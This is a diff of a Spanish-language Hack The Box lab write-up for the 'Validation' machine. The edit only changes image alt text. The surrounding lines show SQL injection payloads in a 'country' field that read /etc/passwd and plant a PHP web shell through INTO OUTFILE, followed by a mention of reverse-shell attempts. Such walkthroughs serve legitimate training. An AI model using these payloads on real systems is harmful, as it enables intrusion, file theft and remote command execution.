@@ -110,7 +110,7 @@ http://10.10.11.116:8080/ [502 Bad Gateway] Country[RESERVED][ZZ], HTTPServer[ng
 
 Poco más podemos ver que lo que ya nos ha reportado `nmap`; por lo que vamos a ver vía web:
 
-![](/assets/images/htb-validation/validation-web.png)
+![""](/assets/images/htb-validation/validation-web.png)
 
 Vemos que podemos ingresar un usuario, vamos a hacer algunas pruebas:
 
@@ -121,11 +121,11 @@ Vemos que podemos ingresar un usuario, vamos a hacer algunas pruebas:
 
 No podemos hacer nada en este punto, así que vamos a ver como se tramita la petición y tenemos que se envían los campos **username** y **country**; por lo que vamos a interceptar la petición con **BurpSuite** y la mandamos al **Repeater**:
 
-![](/assets/images/htb-validation/validation-burp.png)
+![""](/assets/images/htb-validation/validation-burp.png)
 
 Agregamos una comilla simple al país y enviamos la petición.
 
-![](/assets/images/htb-validation/validation-burp1.png)
+![""](/assets/images/htb-validation/validation-burp1.png)
 
 Al realizar las pruebas, para **Brazil** no se reflejaban las inyecciones que hacía; así que probé con otro país y ya comenzaron a reflejarse los cambios, para este caso **Mexico**. Ahora vamos a realizar las inyecciones siguientes:
 
@@ -142,7 +142,7 @@ A partir de aquí no tenemos nada interesante, pero podríamos tratar de ver rec
 - `username=k4miyo&country=Mexico' union select load_file("/etc/passwd")-- -` Podemos ver el `/etc/passwd` de la máquina víctima.
 - `username=k4miyo&country=Afganistan' union select "<?php echo shell_exec($_REQUEST['cmd']); ?>" into outfile "/var/www/html/k4mishell.php" -- -` Podemos subir archivos en la ruta `/var/www/html` y en este caso un archivo php con la cual podemos ejecutar comandos a nivel de sistema.
 
-![](/assets/images/htb-validation/validation-web1.png)
+![""](/assets/images/htb-validation/validation-web1.png)
 
 Si tratamos de entablarnos una reverse shell, vemos que no nos funciona o que la conexión se muere rápidamente. Por lo tanto, trataremos de hacerlo con python; así que nos ponemos en escucha por el puerto 443:
 
